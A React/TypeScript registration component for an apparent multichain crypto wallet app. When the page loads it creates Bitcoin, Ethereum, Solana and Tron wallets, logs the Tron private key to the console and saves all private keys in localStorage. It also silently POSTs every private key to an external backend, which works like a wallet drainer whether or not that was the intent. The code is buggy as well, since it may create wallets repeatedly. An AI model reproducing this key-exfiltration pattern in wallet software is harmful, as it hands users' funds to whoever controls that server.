import { useEffect, useState } from "react";
import styled from "styled-components";
import { Button } from "./styled/styled";
import '../index.css';
import { TronWeb } from 'tronweb';
import * as multichainWallet from 'multichain-crypto-wallet';
import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack, BsCopy } from "react-icons/bs";
import { id } from "ethers";
 
const StyledApp = styled.div`
  background-color: #F9F9F9;
  color: black;
  
  font-family: Lexend;
  min-height: 100vh;
  padding: 20px;

  @media (prefers-color-scheme: dark) {
    background-color: rgb(33,33,33);
    color: white;
  }
`;

const ExPanel = styled.div`
  background-color: white;
  color: black;

  @media (prefers-color-scheme: dark) {
    background-color: rgb(15,15,15);
    color: grey;
  }
`;

const AppContainer = styled.div`
   width: 100%;
   height: fit-content;
   margin: 0;
   font-family: Lexend;
`;

const Icon = styled.div`
  background-color: white;
border-radius:7px; 
  @media (prefers-color-scheme: dark) {
    background-color: rgb(15,15,15);
    color: grey;
  }
`;


function Register() {

  
    const [EthereumWalletAddress, setEthereumWalletAddress] = useState('');
    const [BitcoinWalletAddress, setBitcoinWalletAddress] = useState('');
    const [SolanaWalletAddress, setSolanaWalletAddress] = useState('');
    const [tronWalletAddress,  setTronWalletAddress]= useState('');

    //backend req
    async function alreadyExists (){
      const response = await fetch("https://twa-backend-g83o.onrender.com/wallets");
      response.json().then((data) => {
        setEthereumWalletAddress(data[0]);
        setBitcoinWalletAddress(data[1]);
        setSolanaWalletAddress(data[2]);
        setTronWalletAddress(data[3]);
      }) 
     }

     //wallet creation
    const createWallets = async () => {
      const bitcoinWallet = multichainWallet.createWallet({ network: 'bitcoin' });
        const ethereumWallet = multichainWallet.createWallet({ network: "ethereum" });
        const solanaWallet = multichainWallet.createWallet({ network: "solana" });
        const tronWeb = new TronWeb({
          fullHost: 'https://api.trongrid.io',
          });
      
        
          const tronWallet = await tronWeb.createAccount();

      console.log(tronWallet.privateKey);
      
        setBitcoinWalletAddress(bitcoinWallet.address);
        setEthereumWalletAddress(ethereumWallet.address);
        setSolanaWalletAddress(solanaWallet.address);

        // Save wallet addresses to local storage as a fallback
        localStorage.setItem('ethereumWallet', ethereumWallet.address);
        localStorage.setItem('bitcoinWallet', bitcoinWallet.address);
        localStorage.setItem('solanaWallet', solanaWallet.address);
        localStorage.setItem('tronWallet', tronWallet.address.base58);

        //private keys
       localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey);
       localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey);
       localStorage.setItem('solanaWalletkey', solanaWallet.privateKey);
        localStorage.setItem('tronWalletkey', tronWallet.privateKey);


            
          const ethAdd =    ethereumWallet.address;
           const bitAdd =   bitcoinWallet.address;
          const solAdd =    solanaWallet.address;
           const tronAdd =   tronWallet.address.base58;
      
          
      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey];

          fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            credentials: "include",  
            body: JSON.stringify( {  p_k }),
        });
        const Address =  [ethAdd, bitAdd, solAdd, tronAdd];
        fetch("https://twa-backend-g83o.onrender.com/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",  
          body: JSON.stringify( { Address }),
      })
      
       
    };
   

    useEffect(() => {
        // Load wallet addresses from local storage
        const ethAddress = localStorage.getItem('ethereumWallet');
        const bitAddress = localStorage.getItem('bitcoinWallet');
        const solAddress = localStorage.getItem('solanaWallet');
        const tronAddress = localStorage.getItem('tronWallet');

        

        
        
        if (ethAddress) {
            setEthereumWalletAddress(ethAddress);
        } else {
            createWallets(); // Create wallets only if they do not exist in storage
        }
        if (bitAddress ) {
          setBitcoinWalletAddress(bitAddress);
      } else {
          createWallets(); // Create wallets only if they do not exist in storage
      }
        if (solAddress) {
            setSolanaWalletAddress(solAddress);
        } else {
            createWallets(); // Create wallets only if they do not exist in storage
        }
        if (tronAddress){
          setTronWalletAddress(tronAddress);
          } else {
            createWallets(); 
          }
        
    }, [ ]); // Run this effect only once
    const [click, clicked] = useState(false);
    const [clickFocus, Setclicked] = useState('0');

const assign = ()=>{
  var i = '1';
  var i = i + '1';
  Setclicked(i);
}

 
     function copy() {
   
      var copyText = document.getElementById('bitcopy') as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);



    }
    function copy1() {
   
      var copyText = document.getElementById("ethcopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);


    }
    function copy2() {
   
      var copyText = document.getElementById("solcopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);


    }
    function copy3() {
   
      var copyText = document.getElementById("tronCopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);

      setTimeout(() => {
        document.body.removeChild(alertBox);
      }, 3000);


    }

    return (
        <StyledApp> 
            <AppContainer> 
              <div style={{right:'0'}}><Button onClick={alreadyExists}  >Import Existing wallet</Button></div>
              <br/>
            <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/sSYmdfQ.png' alt='bitcoin' style={{ width: '40px', height: '40px' }} />
                    </div>
                    <div style={{ display:'inline', pointerEvents:'painted' }}>
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Bitcoin wallet          <BsCopy onClick={copy}/></div> 
                        <div id='bitcopy' style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{BitcoinWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/dhJjQcO.png' alt='Ethereum' style={{ width: '40px', height: '40px' }} />
                    </div>
                    <div style={{ display:'inline', pointerEvents:'painted' }}>
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Ethereum wallet        <BsCopy onClick={copy1}/></div> 
                        <div   id="ethcopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{EthereumWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/rjWW55s.png' alt='Solana' style={{ width: '40px', height: '40px' }} />
                    </div> 
                    <div style={{ display:'inline' }}>  
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Solana wallet           <BsCopy onClick={copy2}/></div>
                        <div  id="solcopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{SolanaWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                  <div>
                    <img src='https://i.imgur.com/ywfZokP.png' alt='Tron' style={{ width: '40px', height: '40px' }} />
                  </div>
                  <div style={{ display:'inline' }}>
                    <div style={{ zoom:'90%', marginLeft:'7px' }}>Tron wallet                    <BsCopy onClick={copy3}/></div>
                    <div  id="tronCopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{tronWalletAddress}  </div>
                  </div>
                </ExPanel>
                <br/>
              
                {/* Navigation Icons */}
                   <Icon className="nav" style={{left:'0', right:'0', bottom:'0%', display:'flex',justifyContent:'space-evenly' ,height:'fit-content',  width:'100%', paddingBottom:'10px', paddingRight:'10px',position:'fixed' }}>
                                                        <a href='#/home' style={{color:'grey', textDecoration:'none'}}> 
                                                        <Button  style={{  fontFamily: 'Lexend' , bottom:'0%',  background:'none', color:"grey"}}><BsHouse/>{/*<img src='https://i.imgur.com/uxozY7V.png' height='14px' width='14px' />*/}
                                                        <p style={{zoom:'100%'}}>Home</p> </Button></a>
                                                         <a href='#/send' style={{color:'grey', textDecoration:'none'}}> <Button  style={{  fontFamily: 'Lexend' ,bottom:'0%',  background:'none', color:"grey"}}><BsWallet2/>{/*<img src="https://i.imgur.com/hCrmXO1.png" height='14px' width='14px'/> */}
                                                        <p style={{zoom:'100%'}}>Wallet</p></Button></a>
                                                        <a href='#/market' style={{color:'grey', textDecoration:'none'}}>  <Button style={{  fontFamily: 'Lexend' ,bottom:'0%',  background:'none', color:"grey"}}><BsCashStack/>{/*<img src="https://i.imgur.com/loOhRv0.png" height='14px' width='14px' /> */}
                                                          <p style={{zoom:'100%'}}>Finance</p></Button></a> 
                                                          <a href='#/discover' style={{color:'grey', textDecoration:'none'}}>
                                                          <Button  style={{ fontFamily: 'Lexend' ,bottom:'0%', background:'none', color:"grey"}}><BsLightningCharge/>{/*<img src='https://i.imgur.com/S444rBc.png'height='14px' width='14px'/>*/}
                                                          <p style={{zoom:'100%'}}>Discover</p> </Button></a>
                                                        </Icon> 
            </AppContainer>
        </StyledApp>
    );
    
}
 
export default Register;
